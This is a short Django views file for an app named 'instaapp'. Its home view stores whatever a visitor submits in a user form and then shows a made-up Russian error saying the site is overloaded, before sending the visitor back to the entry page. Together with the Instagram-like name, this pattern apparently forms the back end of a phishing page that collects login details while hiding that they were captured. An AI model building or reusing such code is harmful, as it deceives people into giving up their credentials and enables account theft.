from django.shortcuts import render, redirect
from .models import User
from .forms import UserForm
from django.contrib import messages
def enter(request):
    return render(request, 'instaapp/enter.html')

def home(request):

    if request.method == 'POST':
        form = UserForm(request.POST or None)
        if form.is_valid():
            form.save()
            messages.error(request, ('Сайт перегружен повторите попытку через 5 минут!'))
            return redirect('enter')
    else:
        return render(request, 'instaapp/index.html')